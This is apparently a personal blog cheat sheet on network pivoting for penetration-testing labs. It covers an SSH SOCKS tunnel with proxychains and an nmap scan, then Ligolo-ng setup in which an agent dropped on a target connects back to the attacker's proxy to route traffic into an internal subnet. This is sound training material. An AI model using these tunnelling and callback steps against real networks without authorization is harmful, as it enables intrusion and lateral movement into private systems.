---
layout: post
title: Network Pivoting Techniques
date: 2026-01-25
categories: [network, redteam]
tags: [ligolo-ng, ssh, tunnelling, privesc, lateral-movement]
---

This page aims to be a quick guide / cheat sheet about network pivoting. I update it as I learn new techniques. Hope you (and future me) will find useful stuff in here. Good luck with your network pivoting! 🪃

## Reverse SSH Tunneling 
On host.
```sh
ssh -N -D 5959 root@10.10.110.100 -i root.priv

# edit /etc/proxychains4.conf (or /etc/proxychains.conf)
socks5  127.0.0.1 5959

# nmap via proxychains to scan internal network (port 22)
proxychains nmap -Pn -v -p 22 172.16.1.0/24
```

## Ligolo-ng
### Install
On Kali Linux.
```sh
sudo apt install ligolo-ng
```
### Tunnel setup
Start proxy.
```sh
ligolo-proxy -selfcert
```

Drop the agent on the target, then connect back.
```sh
./agent -connect 10.10.14.186:11601 -ignore-cert
```

You should see the agent connect back.
![](img/dante/ligolo-proxy.png)

Open another terminal and add the new tunnel.
```sh
sudo ip tuntap add dev ligolo mode tun
sudo ip link set ligolo up
sudo ip route add 172.16.1.0/24 dev ligolo
```

Start the tunnel (on ligolo-proxy console).
```sh
start
```

Test the tunnel.
```sh
ping 172.16.1.100
```
### Useful Ligolo-ng proxy commands
```sh
# check target interfaces
ifconfig
```

## Useful resources
- [Pivoting Guide - t3l3machus/pentest-pivoting](https://github.com/t3l3machus/pentest-pivoting)
